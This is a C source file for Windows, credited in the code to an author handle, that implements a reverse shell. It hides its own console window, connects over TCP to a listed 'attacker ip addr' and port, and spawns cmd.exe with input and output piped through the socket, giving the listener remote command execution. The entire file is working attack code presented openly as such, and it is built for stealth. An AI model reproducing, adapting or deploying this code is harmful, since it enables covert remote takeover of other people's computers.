#include <winsock2.h>
#include <stdio.h>
#include <windows.h>
#include <ws2tcpip.h>

#pragma comment(lib, "Ws2_32.lib") // winsocket32 library to define that any windows version can run this application


// author: m3z0diac (hamza07-w)

int main() 
{
    ShowWindow( GetConsoleWindow(), SW_HIDE ); // hide the console of the current process from the user interface and run it in the background
    SOCKET shell;
    sockaddr_in shell_addr;
    WSADATA wsa;
    int connection;
    char ip_addr[] = "127.0.0.1"; // attacker ip addr
    int port = 9999; // attacker listen port
    char recvServer[512];
    char cmdline[] = "cmd.exe"; // the required process for spawn shell

    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    WSAStartup(MAKEWORD(2, 2), &wsa); // initialize winsock
    //create tcp socket
    shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int) NULL, (unsigned int) NULL);
    shell_addr.sin_family = AF_INET;
    shell_addr.sin_port = htons(port);
    shell_addr.sin_addr.s_addr = inet_addr(ip_addr);

    // connect to remote host (server)
    connection = WSAConnect(shell, (SOCKADDR*)&shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL);
    if(connection == SOCKET_ERROR) {
        printf("[!] connection error");
        exit(0);
    }
    else
    {
        recv(shell, recvServer, sizeof(recvServer), 0);
        memset(&si, 0, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
        // pipe (redirect) std (standard) input/output/error to the socket
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE) shell;
        CreateProcess(NULL, cmdline, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi); // create proccess that spawn command prompt (shell)
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        memset(recvServer, 0, sizeof(recvServer));
    }
}